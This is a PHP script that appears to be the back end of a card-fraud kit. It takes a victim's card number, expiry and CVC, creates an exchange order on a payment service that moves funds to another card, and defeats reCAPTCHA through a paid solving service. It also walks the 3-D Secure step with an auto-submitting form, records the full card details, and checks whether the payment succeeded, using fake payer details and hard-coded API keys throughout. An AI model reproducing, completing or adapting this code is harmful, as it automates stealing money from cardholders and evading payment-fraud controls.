<?php
	function xReq($url, $post0 = 0, $post = '', $rh = false, $cookie = false) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		if ($post0 > 0) {
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
			curl_setopt($curl, CURLOPT_HTTPHEADER, [
				'Content-Type: '.(['application/x-www-form-urlencoded', 'application/json'][$post0 - 1]).'; charset=utf-8',
				'User-Agent: Mozilla/5.0',
			]);
		}
		if ($rh)
			curl_setopt($curl, CURLOPT_HEADER, true);
		if ($cookie)
			curl_setopt($curl, CURLOPT_COOKIE, $cookie);
		$result = curl_exec($curl);
		curl_close($curl);
		return $result;
	}

	function xReq2($url, $post = false) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		if ($post) {
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
			curl_setopt($curl, CURLOPT_HTTPHEADER, [
				'Content-Type: application/json',
			]);
		}
		$result = curl_exec($curl);
		curl_close($curl);
		return $result;
	}

	function xRecaptcha($url, $key) {
		$page = json_decode(xReq2('https://api.anti-captcha.com/createTask', '{"clientKey":"КЛЮЧ АНТИКАПЧИ","task":{"type":"NoCaptchaTaskProxyless","websiteURL":"'.$url.'","websiteKey":"'.$key.'"},"softId":0,"languagePool":"en"}'), true);
		if ($page['errorId'] !== 0)
			return '';
		$taskid = $page['taskId'];
		$time1 = time();
		sleep(10);
		while (true) {
			sleep(3);
			$page = json_decode(xReq2('https://api.anti-captcha.com/getTaskResult', '{"clientKey":"КЛЮЧ АНТИКАПЧИ","taskId":'.$taskid.'}'), true);
			if ($page['status'] == 'ready')
				return $page['solution']['gRecaptchaResponse'];
			if (time() - $time1 > 300)
				return '';
		}
		return '';
	}

	function xCookie($head) {
		$ps1 = explode('Set-Cookie: ', $head);
		$cookie = [];
		for ($i = 1; $i < count($ps1); $i++)
			$cookie[] = explode(';', $ps1[$i])[0];
		return implode('; ', $cookie);
	}

	function xCut($s, $s1, $s2) {
		return explode($s2, explode($s1, $s, 2)[1], 2)[0];
	}
	
	function xStatus($md, $pares, $token) {
		$t = explode('`', base64_decode($token), 2);
		$post = http_build_query([
			'MD' => $md,
			'PaRes' => $pares,
		]);
		$page = xReq($t[1], 1, $post, true);
		$check = (strpos($page, '/SUCCESS') !== false);
		$err = '';
		$page = xReq(str_replace('/card-form/', '/card-form-status/', $t[0]));
		if (!$check)
			$err = xCut($page, '"cc__main">'."\r\n".'    ', '  </');
		return [$check, $err];
	}

	function xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop, $xcaptchadata = false) {
		$card2 = getCardBtc();
		$page = json_decode(xReq('https://apikeypay.com/api/1/order-create/?nonce=1&akey=b4687fe9cd91cc6296e011ca37668114486aa70b5a8f5c4348dd09a7e2501233&bkey=3974269a&Order[ip]=127.0.0.1&Order[HTTP_USER_AGENT]=MazillaWindowsNt&Order[psid1]=26&Order[psid2]=12&Order[in]='.$amount.'&Order[out]=1&Order[direct]=0&Order[agreement]=yes&Order[props][0][name]=email&Order[props][0][value]=market@15934240360800.id&Order[props][1][name]=from_acc&Order[props][1][value]='.$card.'&Order[props][2][name]=from_fio&Order[props][2][value]=%D0%98%D0%B2%D0%B0%D0%BD%D0%BE%D0%B2%20%D0%98%D0%B2%D0%B0%D0%BD%20%D0%98%D0%B2%D0%B0%D0%BD%D0%BE%D0%B2%D0%B8%D1%87&Order[props][3][name]=to_acc&Order[props][3][value]='.$card2), true); // ТУТ ВПИСЫВАТЬ AKEY/BKEY/MAIL:PASS Клиента APIKEYPAY.COM
		if ($page['status'] != 'success')
			return [false, $page['msg']];
		$order = $page['value']['id'];
		$page = json_decode(xReq('https://apikeypay.com/api/1/order-pay-info/?nonce=1&akey=b4687fe9cd91cc6296e011ca37668114486aa70b5a8f5c4348dd09a7e2501233&bkey=3974269a&order_id='.$order.'&pd=false'), true); // ТУТ ВПИСЫВАТЬ AKEY/BKEY/MAIL:PASS Клиента APIKEYPAY.COM
		if ($page['status'] != 'success')
			return [false, $page['msg']];
		$url = $page['value']['SCI']['link'];
		$page = xReq($url, 0, '', true);
		$cookie = xCookie($page);
		$hmac = xCut($page, '.hmac = \'', '\'');
		$quid = xCut($page, '.queryID = \'', '\'');
		$cskey = xCut($page, '\'sitekey\' : \'', '\'');
		$post = http_build_query([
			'action' => 'content',
			'queryID' => $quid,
			'hmac' => $hmac,
		]);
		$page = xReq($url, 1, $post, false, $cookie);
		$post = [
			'action' => 'form',
			'cardNumber' => substr($card, 0, 4).' '.substr($card, 4, 4).' '.substr($card, 8, 4).' '.substr($card, 12),
			'expireDate' => $expm.' / '.$expy,
			'cardHolder' => 'ivan ivanov',
			'cvv2' => $cvc,
			'recaptcha' => '',
			'queryID' => $quid,
			'hmac' => $hmac,
		];
		$page = json_decode(xReq($url, 1, http_build_query($post), false, $cookie), true)['data'];
		if ($page['captcha']) {
			$post['recaptcha'] = xRecaptcha($url, $cskey);
			$page = json_decode(xReq($url, 1, http_build_query($post), false, $cookie), true)['data'];
		}
		if ($page['msg'])
			return [false, $page['msg']];
		$page = $page['html'];
		$md = xCut($page, '"MD" value="', '"');
		$pareq = xCut($page, '"PaReq" value="', '"');
		$token = base64_encode($url.'`'.xCut($page, '"TermUrl" value="', '"'));
		$url = xCut($page, '" action="', '"');
		setPayData($md, [$card, $expm, $expy, $cvc, $card2, $amount, $token]);
		return [true, '<body onload="x.submit()"><form id="x" action="'.$url.'" method="POST"><input type="hidden" name="PaReq" value="'.$pareq.'"><input type="hidden" name="MD" value="'.$md.'"><input type="hidden" name="TermUrl" value="'.$redir.'"><noscript><input type="submit" value="Продолжить"></noscript></form>'];
	}
?>